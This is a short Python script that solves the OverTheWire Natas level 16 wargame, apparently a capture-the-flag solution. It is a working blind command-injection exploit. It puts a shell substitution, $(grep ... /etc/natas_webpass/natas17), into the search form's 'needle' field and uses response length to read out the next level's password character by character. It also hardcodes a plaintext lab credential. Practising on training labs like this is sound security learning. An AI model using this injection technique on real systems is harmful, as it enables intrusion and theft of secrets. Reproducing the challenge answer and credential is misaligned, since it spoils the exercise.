import requests
import sys

def extract(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit() 
    alpha_num = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    len_alphanum = len(alpha_num)
    letter = 0
    flag = ""
    while letter < len_alphanum:
        post_data = {
                "needle":"$(grep ^" + flag + alpha_num[letter] + " /etc/natas_webpass/natas17)",
                "submit":"Search"
                }
        content = requests.post(url,auth=(username,password),data=post_data)
        if len(content.text) == 461926:
            sys.stdout.write(f"\rExtracting flag: {flag}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
        else:
            flag = flag + alpha_num[letter]
            letter = 0
    print(f"\rThe flag for natas16 is:  {flag.ljust(20)}")

if __name__=="__main__":
    url = "http://natas16.natas.labs.overthewire.org/"
    username = "natas16"
    password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
    extract(url,username,password)